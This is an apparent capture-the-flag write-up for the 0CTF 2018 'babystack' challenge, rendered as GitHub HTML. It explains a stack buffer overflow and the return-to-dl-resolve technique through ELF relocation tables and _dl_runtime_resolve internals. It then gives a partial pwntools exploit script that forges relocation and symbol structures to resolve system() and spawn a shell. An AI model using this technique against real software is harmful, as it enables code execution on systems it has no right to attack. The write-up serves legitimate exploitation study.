+<h2><a id="user-content-1-binary-analysis" class="anchor" aria-hidden="true" href="#1-binary-analysis"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>1. Binary analysis</h2>
+<p>I downloaded the provided binary <a href="http://dl.0ops.net/2018/babystack.tar.gz" rel="nofollow">babystack</a> and quickly fired up binaryninja alongside with gdb to analyze it. I quickly realized a buffer overflow vulnerability is present within <code>sub_804843b</code>.
+My first approach was to solve this challenge using a return-to-libc attack by leaking the base address of the library and call system in order to get a shell. <br>
+This technique is contingent on:</p>
+<ol>
+<li>Leaking libc base address</li>
+<li>Knowing the version of libc to get the offset of <code>system</code>.</li>
+</ol>
+<p>However, the version of libc on the remote server was unknown and the ELF did not provide any function that can be used to leak addresses.
+To put it another way, without any of the two requirements fulfilled, return-to libc is not suitable for this scenario.</p>
+<div class="highlight highlight-source-assembly"><pre><span class="pl-en">sub_804843b:</span>
+<span class="pl-k">push</span><span class="pl-en">    </span><span class="pl-v">ebp</span>
+<span class="pl-k">mov</span><span class="pl-en">     </span><span class="pl-v">ebp</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-v">esp</span>
+<span class="pl-k">sub</span><span class="pl-en">     </span><span class="pl-v">esp</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-c1">0x28</span><span class="pl-en"> {var_2c}</span>
+<span class="pl-k">sub</span><span class="pl-en">     </span><span class="pl-v">esp</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-c1">0x4</span><span class="pl-en"> {var_30}</span>
+<span class="pl-k">push</span><span class="pl-en">    </span><span class="pl-c1">0x40</span>
+<span class="pl-k">lea</span><span class="pl-en">     </span><span class="pl-v">eax</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-s1">[</span><span class="pl-v">ebp</span><span class="pl-s1">-</span><span class="pl-c1">0x28</span><span class="pl-en"> {var_2c}</span><span class="pl-s1">]</span>
+<span class="pl-k">push</span><span class="pl-en">    </span><span class="pl-v">eax</span>
+<span class="pl-k">push</span><span class="pl-en">    </span><span class="pl-c1">0x0</span>
+<span class="pl-k">call</span><span class="pl-en">    read # read(</span><span class="pl-c1">0</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-v">ebp</span><span class="pl-s1">-</span><span class="pl-c1">0x28</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-c1">0x40</span><span class="pl-en">) buffer overflow :)</span>
+<span class="pl-k">add</span><span class="pl-en">     </span><span class="pl-v">esp</span><span class="pl-s1">,</span><span class="pl-en"> </span><span class="pl-c1">0x10</span><span class="pl-en"> {var_2c}</span>
+<span class="pl-k">nop</span><span class="pl-en">     </span>
+<span class="pl-k">leave</span><span class="pl-en">    {__saved_ebp}</span>
+<span class="pl-en">retn    </span></pre></div>
+<h2><a id="user-content-2-overview-of-the-problem" class="anchor" aria-hidden="true" href="#2-overview-of-the-problem"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>2. Overview of the problem:</h2>
+<ul>
+<li><b> 32-bit </b></li>
+<li><b> ASLR, NX, Partial RELRO, NO PIE </b></li>
+<li><b> Unknown libc version</b></li>
+<li><b> Missing a way to leak (print) data </b></li>
+</ul>
+<p>At this point, I had no idea of how to exploit the binary.
+After "googling" for a while I came across this interesting phrack article[1] and numerous write-ups in chinese about the return2-dl-resolve technique[2].
+Considering the lack of documentation for this particular return-to attack and its remarkable use in binary exploitation, I have decided to write this article to clarify the underneath of this technique and to walk you through the stages of crafting a properly working payload.</p>
+<h2><a id="user-content-3-elf-relocation" class="anchor" aria-hidden="true" href="#3-elf-relocation"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>3. ELF relocation</h2>
+<p>A given ELF object defines some symbols and imports/uses some others. The dynamic linker needs to connect those references by placing the value of the symbols (the effective address of the referenced variable/function) where the ELF object expects to find it. This process of resolving the symbol references is called relocation [3].
+Lazy binding (relocation at runtime) of imported symbols happens during the first call of the function using the well-known PLT and GOT sections [4][5][6].</p>
+<div class="highlight highlight-source-shell"><pre>gdb-peda$ x/3i <span class="pl-smi">$eip</span>
+=<span class="pl-k">&gt;</span> 0x8048300 <span class="pl-k">&lt;</span>read@plt<span class="pl-k">&gt;</span>:	jmp    DWORD PTR ds:0x804a00c
+   0x8048306 <span class="pl-k">&lt;</span>read@plt+<span class="pl-k">6&gt;</span>:	push   0x0
+   0x804830b <span class="pl-k">&lt;</span>read@plt+<span class="pl-k">11&gt;</span>:	jmp    0x80482f0
+gdb-peda$ x/1wx 0x804a00c
+0x804a00c:	0x08048306</pre></div>
+<p>During relocation of any function symbol, IP will jump to PLT and try to resolve the symbol. As presented above, the process is quite straightforward: a value is pushed to the stack and some kind of "resolver" is called (0x80482f0).
+The resolved address will be given from the GOT entry for any further call to the function and the IP will be directly jump to the epilogue of the subroutine.
+The purpose of our attack is to resolve any function symbol from libc at runtime even if our ELF object does not import it.</p>
+<h2><a id="user-content-4-background-knowledge" class="anchor" aria-hidden="true" href="#4-background-knowledge"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>4. Background knowledge</h2>
+<p>The .dynamic section of the ELF file contains information used by ld.so to resolve the symbols at runtime.</p>
+<div class="highlight highlight-source-shell"><pre><span class="pl-c"><span class="pl-c">#</span> readelf -d ./babystack</span>
+
+Dynamic section at offset 0xf14 contains 24 entries:
+  Tag        Type                         Name/Value
+ 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
+ 0x0000000c (INIT)                       0x80482c8
+ 0x0000000d (FINI)                       0x80484f4
+ 0x00000019 (INIT_ARRAY)                 0x8049f08
+ 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
+ 0x0000001a (FINI_ARRAY)                 0x8049f0c
+ 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
+ 0x6ffffef5 (GNU_HASH)                   0x80481ac
+ 0x00000005 (STRTAB)                     0x804822c
+ 0x00000006 (SYMTAB)                     0x80481cc
+ 0x0000000a (STRSZ)                      80 (bytes)
+ 0x0000000b (SYMENT)                     16 (bytes)
+ 0x00000015 (DEBUG)                      0x0
+ 0x00000003 (PLTGOT)                     0x804a000
+ 0x00000002 (PLTRELSZ)                   24 (bytes)
+ 0x00000014 (PLTREL)                     REL
+ 0x00000017 (JMPREL)                     0x80482b0
+ 0x00000011 (REL)                        0x80482a8
+ 0x00000012 (RELSZ)                      8 (bytes)
+ 0x00000013 (RELENT)                     8 (bytes)
+ 0x6ffffffe (VERNEED)                    0x8048288
+ 0x6fffffff (VERNEEDNUM)                 1
+ 0x6ffffff0 (VERSYM)                     0x804827c
+ 0x00000000 (NULL)                       0x0
+</pre></div>
+<p>We will focus on SYMTAB, STRTAB, and JMPREL.</p>
+<h3><a id="user-content-41-jmprel" class="anchor" aria-hidden="true" href="#41-jmprel"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a><em><b>4.1 JMPREL</b></em></h3>
+<p>JMPREL segment (corresponds to 'rel.plt') stores a table called <code>Relocation table</code>. Each entry maps to a symbol.</p>
+<div class="highlight highlight-source-shell"><pre><span class="pl-c"><span class="pl-c">#</span> readelf -r ./babystack</span>
+
+Relocation section <span class="pl-s"><span class="pl-pds">'</span>.rel.dyn<span class="pl-pds">'</span></span> at offset 0x2a8 contains 1 entries:
+ Offset     Info    Type            Sym.Value  Sym. Name
+08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__
+
+Relocation section <span class="pl-s"><span class="pl-pds">'</span>.rel.plt<span class="pl-pds">'</span></span> at offset 0x2b0 contains 3 entries:
+ Offset     Info    Type            Sym.Value  Sym. Name
+0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
+0804a010  00000207 R_386_JUMP_SLOT   00000000   alarm@GLIBC_2.0
+0804a014  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</pre></div>
+<p>The type of these entries is <code>Elf32\_Rel</code>, which is defined as it follows. The size of one entry is 8 bytes.</p>
+<div class="highlight highlight-source-c"><pre><span class="pl-k">typedef</span> <span class="pl-c1">uint32_t</span> Elf32_Addr ; 
+<span class="pl-k">typedef</span> <span class="pl-c1">uint32_t</span> Elf32_Word ; 
+<span class="pl-k">typedef</span> <span class="pl-k">struct</span> 
+{
+   Elf32_Addr r_offset ; <span class="pl-c"><span class="pl-c">/*</span> Address <span class="pl-c">*/</span></span> 
+   Elf32_Word r_info ; <span class="pl-c"><span class="pl-c">/*</span> Relocation type and symbol index <span class="pl-c">*/</span></span> 
+} Elf32_Rel ; 
+#<span class="pl-k">define</span> <span class="pl-en">ELF32_R_SYM</span>(<span class="pl-v">val</span>) ((val) &gt;&gt; <span class="pl-c1">8</span>) 
+#<span class="pl-k">define</span> <span class="pl-en">ELF32_R_TYPE</span>(<span class="pl-v">val</span>) ((val) &amp; <span class="pl-c1">0xff</span>)</pre></div>
+<p>Let's take a look at the first entry of our table:</p>
+<ul>
+<li>The column Name gives the name of our symbol: <code>read@GLIBC_2.0</code>;</li>
+<li>Offset is the address of the GOT entry for the symbol: <code>0x0804a00c</code>;</li>
+<li>Info stores additional metadata such as <code>ELF32_R_SYM</code> or <code>ELF32_R_TYPE</code>;</li>
+</ul>
+<p>According to the defined MACROS, <code>ELF32_R_SYM(r_info) == 1</code> and  <code>ELF32_R_TYPE(r_info) == 7 (R_386_JUMP_SLOT)</code>.
+Keep in mind that <code>R_SYM</code> is 1. We will use this later.</p>
+<h3><a id="user-content-42-strtab" class="anchor" aria-hidden="true" href="#42-strtab"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a><em><b>4.2 STRTAB</b></em></h3>
+<p>STRTAB is a simple table that stores the strings for symbols name.</p>
+<pre><code>gdb-peda$ x/10s 0x804822c
+0x804822c:	""
+0x804822d:	"libc.so.6"
+0x8048237:	"_IO_stdin_used"
+0x8048246:	"read"
+0x804824b:	"alarm"
+0x8048251:	"__libc_start_main"
+0x8048263:	"__gmon_start__"
+0x8048272:	"GLIBC_2.0"
+</code></pre>
+<h3><a id="user-content-43-symtab" class="anchor" aria-hidden="true" href="#43-symtab"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a><em><b>4.3 SYMTAB</b></em></h3>
+<p>This table holds relevant symbol information. Each entry is a  <code>Elf32_Sym</code> structure and its size is 16 bytes.</p>
+<div class="highlight highlight-source-c"><pre><span class="pl-k">typedef</span> <span class="pl-k">struct</span> 
+{ 
+   Elf32_Word st_name ; <span class="pl-c"><span class="pl-c">/*</span> Symbol name (string tbl index) <span class="pl-c">*/</span></span>
+   Elf32_Addr st_value ; <span class="pl-c"><span class="pl-c">/*</span> Symbol value <span class="pl-c">*/</span></span> 
+   Elf32_Word st_size ; <span class="pl-c"><span class="pl-c">/*</span> Symbol size <span class="pl-c">*/</span></span> 
+   <span class="pl-k">unsigned</span> <span class="pl-k">char</span> st_info ; <span class="pl-c"><span class="pl-c">/*</span> Symbol type and binding <span class="pl-c">*/</span></span> 
+   <span class="pl-k">unsigned</span> <span class="pl-k">char</span> st_other ; <span class="pl-c"><span class="pl-c">/*</span> Symbol visibility under glibc&gt;=2.2 <span class="pl-c">*/</span></span> 
+   Elf32_Section st_shndx ; <span class="pl-c"><span class="pl-c">/*</span> Section index <span class="pl-c">*/</span></span> 
+} Elf32_Sym ;</pre></div>
+<p>The first field, <code>st_name</code>, gives the offset in <code>STRTAB</code> where the name of the symbol begins.
+The other fields of this structure are not used in the exploit, so I will not cover them.
+The <code>ELF32_R_SYM(r_info) == 1</code> variable (which we got from the JMPREL table) gives the index of the Elf32_Sym in SYMTAB for the specified symbol.
+In this particular case, index is 1. Let's analyze this entry.</p>
+<div class="highlight highlight-source-c"><pre>gdb-peda$ x/4wx <span class="pl-c1">0x80481cc</span> + <span class="pl-c1">1</span> * <span class="pl-c1">16</span> <span class="pl-c"><span class="pl-c">//</span> (SYMTAB + index*sizeof(entry)) where index = ELF32_R_SYM(r_info)</span>
+<span class="pl-c1">0x80481dc</span>:	<span class="pl-c1">0x0000001a</span>	<span class="pl-c1">0x00000000</span>	<span class="pl-c1">0x00000000</span>	<span class="pl-c1">0x00000012</span> 
+                    |_____
+                          |
+gdb-peda$ x/1s <span class="pl-c1">0x804822c</span>+<span class="pl-c1">0x1a</span> <span class="pl-c"><span class="pl-c">//</span> (STRTAB + st_name)</span>
+<span class="pl-c1">0x8048246</span>:	<span class="pl-s"><span class="pl-pds">"</span>read<span class="pl-pds">"</span></span>
+gdb-peda$ </pre></div>
+<p>Adding the first 4 bytes from elf32_sym to STRTAB gives the address of the symbol name.</p>
+<h1><a id="user-content-5-_dl_runtime_resolve" class="anchor" aria-hidden="true" href="#5-_dl_runtime_resolve"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>5. _dl_runtime_resolve</h1>
+<p>With the concepts of <code>JMPREL</code>, <code>SYMTAB</code> and <code>STRTAB</code> in mind, let's break down how resolving symbols works.</p>
+<div class="highlight highlight-source-c"><pre>gdb-peda$ x/3i $eip
+=&gt; <span class="pl-c1">0x8048300</span> &lt;read@plt&gt;:	jmp    DWORD PTR ds:<span class="pl-c1">0x804a00c</span>
+   <span class="pl-c1">0x8048306</span> &lt;read@plt+<span class="pl-c1">6</span>&gt;:	push   <span class="pl-c1">0x0</span>
+   <span class="pl-c1">0x804830b</span> &lt;read@plt+<span class="pl-c1">11</span>&gt;:	jmp    <span class="pl-c1">0x80482f0</span>
+gdb-peda$ x/1xw <span class="pl-c1">0x804a00c</span>
+<span class="pl-c1">0x804a00c</span>:	<span class="pl-c1">0x08048306</span>
+gdb-peda$ x/2i <span class="pl-c1">0x80482f0</span>
+   <span class="pl-c1">0x80482f0</span>:	push   DWORD PTR ds:<span class="pl-c1">0x804a004</span>
+   <span class="pl-c1">0x80482f6</span>:	jmp    DWORD PTR ds:<span class="pl-c1">0x804a008</span>
+gdb-peda$ </pre></div>
+<ol>
+<li>The program reads the GOT value from (0x804a00c) and jumps back into the PLT section.</li>
+<li>Push the parameter 0x0 to the stack.</li>
+<li>Push extra parameter and jumps to resolver.</li>
+</ol>
+<p>The process specified above is equivalent to the following function call:<br>
+<code>_dl_runtime_resolve ( link_map , rel_offset )</code><br>
+The rel_offset gives the offset of the <code>Elf32_Rel</code> in JMPREL table. <code>Link_map (0x804a004)</code> is nothing but a list with all the loaded libraries. <code>_dl_runtime_resolve</code> uses this list to resolve the symbol.
+After relocating the symbol and its entry in SYMTAB populated, the initial call of read will be invoked.
+The pseudocode  below summarize the process described until now:</p>
+<div class="highlight highlight-source-c"><pre><span class="pl-c"><span class="pl-c">//</span> call of unresolved read(0, buf, 0x100)</span>
+<span class="pl-en">_dl_runtime_resolve</span>(link_map, rel_offset) {
+    Elf32_Rel * rel_entry = JMPREL + rel_offset ;
+    Elf32_Sym * sym_entry = &amp;SYMTAB [ <span class="pl-c1">ELF32_R_SYM</span> ( rel_entry -&gt; r_info )];
+    <span class="pl-k">char</span> * sym_name = STRTAB + sym_entry -&gt; st_name ;
+    <span class="pl-c1">_search_for_symbol_</span>(link_map, sym_name);
+    <span class="pl-c"><span class="pl-c">//</span> invoke initial read call now that symbol is resolved</span>
+    <span class="pl-c1">read</span>(<span class="pl-c1">0</span>, buf, <span class="pl-c1">0x100</span>);
+}</pre></div>
+<h1><a id="user-content-6-exploit" class="anchor" aria-hidden="true" href="#6-exploit"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>6. Exploit</h1>
+<p>Now that we have covered the principle behind lazy binding, we can start crafting the exploit.
+You may have already noticed that bounds checks are missing. Thus, the main idea is to provide
+a big <code>rel_offset</code> such that the <code>rel_entry</code> to be found within our controllable area.
+We can craft forged structures for <code>Elf32_Rel</code> and <code>Elf32_Sym</code> that will force the <code>_dl_runtime_resolve</code> to bind the <code>system</code> function symbol.
+The key is that the index of the corresponding pseudo-entry should be calculated correctly.
+It is important not to forget that our function will be called after being resolved, so the parameter for the <code>system</code> function should already be on the stack before calling the resolver.</p>
+<p>For <strong>demonstration purposes only</strong>, let us suppose that:</p>
+<ul>
+<li>JMPREL @ <code>0x0</code></li>
+<li>SYMTAB @ <code>0x100</code></li>
+<li>STRTAB @ <code>0x200</code></li>
+<li>controllable area @ <code>0x300</code></li>
+</ul>
+<p>We need to craft our <code>Elf32_Rel</code> and <code>Elf32_Sym</code> somewhere within the controllable area and provide a <code>rel_offset</code> such that the resolver reads our special forged structures.
+Let's suppose that the controllable (stack after pivotation ??? ) are has the following layout.</p>
+<pre><code>             +--------+
+r_offset     |GOT     |  0x300     
+r_info       |0x2100  |  0x304
+alignment    |AAAAAAAA|  0x308
+st_name      |0x120   |  0x310
+st_value     |0x0     |
+st_size      |0x0     |
+others       |0x12    |
+sym_string   |"syst   |  0x320
+             |em\x00" |
+             +--------+
+</code></pre>
+<p>When <code>_dl_runtime_resolve ( link_map , 0x300)</code> is called, the 0x300 offset is used to get the <code>Elf32_Rel* rel = JMPREL + 0x300 == 0x300.</code><br>
+Secondly, the Elf32_Sym is accessed using the <code>r_info</code> field from 0x304. <code> Elf32_Sym* sym = &amp;SYMTAB[(0x2100 &gt;&gt; 8)] == 0x310.</code><br>
+The last step is to compute the address of the symbol string. This is done by adding <code>st_name</code> to <code>STRTAB</code> : <code> const char *name = STRTAB + 0x120 == 0x320</code>.<br>
+Note that SYMTAB access its entries as an array, therefore ELF32_sym should be aligned to 0x10 bytes.
+Now that we control st_name, we can basically force the resolver to relocate  <code>system</code> and call <code>system('sh') </code> to a own the system :)<br>
+Writing the payload should be easy now that we have a clear image of the forged memory layout.</p>
+<h1><a id="user-content-7-payload" class="anchor" aria-hidden="true" href="#7-payload"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>7. Payload</h1>
+<div class="highlight highlight-source-python"><pre><span class="pl-k">from</span> <span class="pl-s1">pwn</span> <span class="pl-k">import</span> <span class="pl-c1">*</span>
+<span class="pl-s1">r</span> <span class="pl-c1">=</span> <span class="pl-en">process</span>(<span class="pl-s">"./babystack"</span>)
+<span class="pl-s1">_elf</span> <span class="pl-c1">=</span> <span class="pl-v">ELF</span>(<span class="pl-s">"./babystack"</span>)
+<span class="pl-s1">resolver</span> <span class="pl-c1">=</span> <span class="pl-c1">0x80482F0</span>    <span class="pl-c">#push link_map and call dl_resolve</span>
+<span class="pl-s1">buf</span> <span class="pl-c1">=</span> <span class="pl-c1">0x804af00</span>         <span class="pl-c">#controllable area (.bss)</span>
+<span class="pl-s1">leave_ret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x8048455</span>   <span class="pl-c">#gadget</span>
+<span class="pl-v">SYMTAB</span> <span class="pl-c1">=</span> <span class="pl-c1">0x080481cc</span>
+<span class="pl-v">STRTAB</span> <span class="pl-c1">=</span> <span class="pl-c1">0x0804822c</span>
+<span class="pl-v">JMPREL</span> <span class="pl-c1">=</span> <span class="pl-c1">0x080482b0</span>
+
+<span class="pl-c"># Pivoting the stack and calling read(0, buf, 0x80) for the rest of the payload</span>
+<span class="pl-s1">buffer</span> <span class="pl-c1">=</span> <span class="pl-s">""</span>
+<span class="pl-s1">buffer</span> <span class="pl-c1">+=</span> <span class="pl-s">"A"</span><span class="pl-c1">*</span><span class="pl-c1">40</span>
+<span class="pl-s1">buffer</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">buf</span>)   <span class="pl-c">#stack pivoting. (esp = buff)</span>
+<span class="pl-s1">buffer</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">_elf</span>.<span class="pl-s1">plt</span>[<span class="pl-s">"read"</span>]) <span class="pl-c1">+</span> <span class="pl-en">p32</span>(<span class="pl-s1">leave_ret</span>) <span class="pl-c1">+</span> <span class="pl-en">p32</span>(<span class="pl-c1">0</span>) <span class="pl-c1">+</span> <span class="pl-en">p32</span>(<span class="pl-s1">buf</span>) <span class="pl-c1">+</span> <span class="pl-en">p32</span>(<span class="pl-c1">0x80</span>) 
+
+<span class="pl-c"># Compute offsets and forged structures</span>
+<span class="pl-s1">forged_ara</span> <span class="pl-c1">=</span> <span class="pl-s1">buf</span> <span class="pl-c1">+</span> <span class="pl-c1">0x14</span>
+<span class="pl-s1">rel_offset</span> <span class="pl-c1">=</span> <span class="pl-s1">forged_ara</span> <span class="pl-c1">-</span> <span class="pl-v">JMPREL</span>
+<span class="pl-s1">elf32_sym</span> <span class="pl-c1">=</span> <span class="pl-s1">forged_ara</span> <span class="pl-c1">+</span> <span class="pl-c1">0x8</span> <span class="pl-c">#size of elf32_sym</span>
+
+<span class="pl-s1">align</span> <span class="pl-c1">=</span> <span class="pl-c1">0x10</span> <span class="pl-c1">-</span> ((<span class="pl-s1">elf32_sym</span> <span class="pl-c1">-</span> <span class="pl-v">SYMTAB</span>) <span class="pl-c1">%</span> <span class="pl-c1">0x10</span>) <span class="pl-c">#align to 0x10</span>
+
+<span class="pl-s1">elf32_sym</span> <span class="pl-c1">=</span> <span class="pl-s1">elf32_sym</span> <span class="pl-c1">+</span> <span class="pl-s1">align</span>
+<span class="pl-s1">index_sym</span> <span class="pl-c1">=</span> (<span class="pl-s1">elf32_sym</span> <span class="pl-c1">-</span> <span class="pl-v">SYMTAB</span>) <span class="pl-c1">/</span> <span class="pl-c1">0x10</span>
+
+<span class="pl-s1">r_info</span> <span class="pl-c1">=</span> (<span class="pl-s1">index_sym</span> <span class="pl-c1">&lt;&lt;</span> <span class="pl-c1">8</span>) <span class="pl-c1">|</span> <span class="pl-c1">0x7</span> 
+
+<span class="pl-s1">elf32_rel</span> <span class="pl-c1">=</span> <span class="pl-en">p32</span>(<span class="pl-s1">_elf</span>.<span class="pl-s1">got</span>[<span class="pl-s">'read'</span>]) <span class="pl-c1">+</span> <span class="pl-en">p32</span>(<span class="pl-s1">r_info</span>)
+<span class="pl-s1">st_name</span> <span class="pl-c1">=</span> (<span class="pl-s1">elf32_sym</span> <span class="pl-c1">+</span> <span class="pl-c1">0x10</span>) <span class="pl-c1">-</span> <span class="pl-v">STRTAB</span>
+<span class="pl-s1">elf32_sym_struct</span> <span class="pl-c1">=</span> <span class="pl-en">p32</span>(<span class="pl-s1">st_name</span>) <span class="pl-c1">+</span> <span class="pl-en">p32</span>(<span class="pl-c1">0</span>) <span class="pl-c1">+</span> <span class="pl-en">p32</span>(<span class="pl-c1">0</span>) <span class="pl-c1">+</span> <span class="pl-en">p32</span>(<span class="pl-c1">0x12</span>)
+
+<span class="pl-c"># Rest of the payload: dl-resolve hack :) (the real deal)</span>
+<span class="pl-s1">buffer2</span> <span class="pl-c1">=</span> <span class="pl-s">'AAAA'</span>                <span class="pl-c">#fake ebp</span>
+<span class="pl-s1">buffer2</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">resolver</span>)        <span class="pl-c"># ret-to dl_resolve</span>
+<span class="pl-s1">buffer2</span> <span class="pl-c1">+=</span> <span class="pl-en">p32</span>(<span class="pl-s1">rel_offset</span>)      <span class="pl-c">#JMPRL + offset = struct</span>
+<span class="pl-s1">buffer2</span> <span class="pl-c1">+=</span> <span class="pl-s">'AAAA'</span>               <span class="pl-c">#fake return </span>
